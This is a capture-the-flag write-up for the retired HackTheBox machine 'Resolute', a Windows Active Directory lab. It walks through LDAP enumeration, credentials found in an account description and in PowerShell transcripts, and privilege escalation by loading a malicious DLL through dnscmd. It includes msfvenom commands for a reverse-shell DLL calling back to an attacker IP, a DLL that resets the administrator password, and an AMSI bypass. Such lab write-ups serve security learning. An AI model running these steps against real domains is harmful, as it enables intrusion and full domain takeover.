# Resolute

HacktheBox Retired Machine
10.10.10.169

tags: #go-windapsearch #ldapsearch #ldap #rpclient #impacket #dns #msfvenom #smb
#### Windows Server with Active Directory and DNS

Using windapsearch from Reference: https://github.com/ropnop/go-windapsearch

```bash
/home/kali/github/go-windapsearch/windapsearch-linux-amd64 -m users -d resolute.megabank.local --dc-ip 10.10.10.169 | tee usersScan.txt
```

Found that the below command is a little different than the above to get the users attributes of the description
```bash
/windapsearch.bin -m users -d resolute.megabank.local --dc 10.10.10.169 --full
```

Returned a list of users... 

List of users
```txt
sunita, abigail, DefaultAccount, ryan, Guest, marko, marcus, gustavo, ulf, sally, fred, angela, felicia, stevie, annika, per, claire, paulo, annette, steve, claude, melanie, zach, simon, naoki
```

Ran ldapsearch to find the additonal information I needed... The password is in the description of an account...

```bash
ldapsearch -h 10.10.10.169 -p389 -x -b dc=megabank,dc=local | tee ldapsearchResults.txt
```

Results
```txt
description: Account created. Password set to Welcome123!
sAMAccountName: marko
```

Also in the results we see that the account lockout policy is 0
```bash
lockoutThreshold: 0
```

Identified the melanie account can login with Welcome123!
```bash
rpcclient -U "melanie%Welcome123!" -c "dir" 10.10.10.169
```

In the powershell transcription logs look at the hidden directories... dir -h
```txt
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
```

Here we find ryans password...

Execute whoami /all to determine the privileges that you have...

Reference to lolbins: https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/

Spin up a fileshare using smbserver.py from Impacket
```bash
python3 /home/kali/github/impacket/examples/smbserver.py -comment 'Temp Share' s /home/kali/hackthebox/output/resolute
```

Did not see the initial connection to the SMB server to pull the dll, wanted to verify connectivity...  Ran the below command to mount the directory

```cmd
net use z: \\10.10.14.17\s
```

I did change the above smbserver command to be s instead of tmp for the drive...  To view the mount run get-psdrive in evil-winrm

--- I could not get the dll to work off of mounting it from a share when it was a msfvenom reverse shell...

```bash
#rev shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.17 LPORT=4444 -f dll -o rev.dll
```

Created a msfvenom to change the administrator password...
```bash
msfvenom -p windows/x64/exec cmd='net user administrator P@ssword123! /domain' -f dll -o rev2.dll
```

Using evil-winrm ran the amsibypass invoke-snow.ps1

With DNS privileges loaded the dll...
```cmd
cmd /c dnscmd.exe localhost /config /serverlevelplugindll \\10.10.14.17\s\rev2.dll
```

Then with additional privs I am able to start and stop the DNS server...

```cmd
sc stop dns
sc start dns
```

The connection to the SMB server shows the file was pulled...
Then using psexec impacket I am able to connect with the administrators password that was setup...

```bash
python3 /home/kali/github/impacket/examples/psexec.py megabank.local/administrator@10.10.10.169
```

